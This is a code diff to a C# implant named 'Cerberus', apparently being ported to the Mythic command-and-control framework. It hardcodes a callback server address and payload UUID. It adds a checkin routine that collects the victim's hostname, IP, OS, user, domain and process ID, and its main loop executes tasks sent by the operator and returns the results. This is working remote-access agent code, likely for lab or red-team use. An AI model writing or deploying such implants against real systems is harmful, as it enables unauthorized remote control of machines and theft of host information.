@@ -4,6 +4,7 @@ using System;
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.Linq;
+using System.Net;
 using System.Reflection;
 using System.Security.Principal;
 using System.Threading;
@@ -21,8 +22,13 @@ namespace Cerberus
         private static int SleepTime = 1000;
         private static CommunicationType _commType = CommunicationType.http;
 
-        private static string connectAddress = "localhost";
-        private static int connectPort = 8080;
+        private static string serverAddress = "10.0.2.128";
+        private static int serverPort = 80;
+        private static string PayloadUUID = "1f1c7796-ff57-47ec-8655-1a5695bc2f20";
+        private static string UUID = "1f1c7796-ff57-47ec-8655-1a5695bc2f20";
+        private string killdate = "";
+
+
 
         public enum CommunicationType
         {
@@ -32,7 +38,7 @@ namespace Cerberus
 
         static void Main(string[] args)
         {
-            Thread.Sleep(10000);
+            Thread.Sleep(5000);
 
             GenerateMetadata();
             LoadCerberusCommands();
@@ -40,11 +46,13 @@ namespace Cerberus
 
             if (_commType == CommunicationType.http)
             {
-                _commModule = new HttpCommModule(connectAddress, connectPort, SleepTime, _metadata);
+                _commModule = new HttpCommModule(serverAddress, serverPort, SleepTime, _metadata, PayloadUUID);
                 _commModule.Init(_metadata);
                 _commModule.Start();
 
                 _cancellationTokenSource = new CancellationTokenSource();
+
+                UUID = _commModule.Metadata.uuid;
 
                 while (!_cancellationTokenSource.IsCancellationRequested)
                 {
@@ -62,7 +70,7 @@ namespace Cerberus
 
             
 
-        private static void HandleTasks(IEnumerable<CerberusTask> tasks)
+        private static void HandleTasks(IEnumerable<MythicTask> tasks)
         {
             foreach (var task in tasks)
             {
@@ -70,33 +78,39 @@ namespace Cerberus
             }
         }
 
-        private static void HandleTask(CerberusTask task)
+        private static void HandleTask(MythicTask task)
         {
-            var command = _commands.FirstOrDefault(c => c.Name.Equals(task.Command, StringComparison.OrdinalIgnoreCase));
+            var command = _commands.FirstOrDefault(c => c.Name.Equals(task.command, StringComparison.OrdinalIgnoreCase));
 
             if (command is null)
             {
-                SendTaskResult(task.Id, "Command not found.");
+                SendTaskResult(task, "Command not found.");
                 return;
             }
 
             try
             {
                 var result = command.Execute(task);
-                SendTaskResult(task.Id, result);
+                SendTaskResult(task, result);
             }
             catch (Exception ex)
             {
-                SendTaskResult(task.Id, ex.Message);
+                SendTaskResult(task, ex.Message);
             }
         }
 
-        private static void SendTaskResult(string taskId, string result)
+        private static void SendTaskResult(MythicTask task, string result)
         {
-            var taskResult = new CerberusTaskResult
+            if (!task.completed)
             {
-                Id = taskId,
-                Result = result
+                return;
+            }
+
+            var taskResult = new MythicTaskResult
+            {
+                task_id = task.id,
+                user_output = result,
+                completed = task.completed,
             };
 
             _commModule.SendData(taskResult);
@@ -125,7 +139,7 @@ namespace Cerberus
         {
             var process = Process.GetCurrentProcess();
             var identity = WindowsIdentity.GetCurrent();
-            var principal = new WindowsPrincipal(identity);
+            /*var principal = new WindowsPrincipal(identity);
 
             var integrity = "Medium";
 
@@ -147,6 +161,24 @@ namespace Cerberus
                 ProcessId = process.Id,
                 Integrity = integrity,
                 Architecture = IntPtr.Size == 8 ? "x64" : "x86"
+            };
+*/
+            
+
+            string hostname = Environment.MachineName;
+            IPHostEntry ipEntry = Dns.GetHostEntry(hostname);
+
+            _metadata = new CerberusMetadata
+            {
+                action = "checkin",
+                ip = ipEntry.AddressList[0].ToString(),
+                os = Environment.OSVersion.ToString(),
+                user = identity.Name,
+                host = hostname,
+                domain = Environment.UserDomainName,
+                pid = process.Id,
+                uuid = PayloadUUID,
+                architecture = IntPtr.Size == 8 ? "x64" : "x86"
             };
 
             process.Dispose();
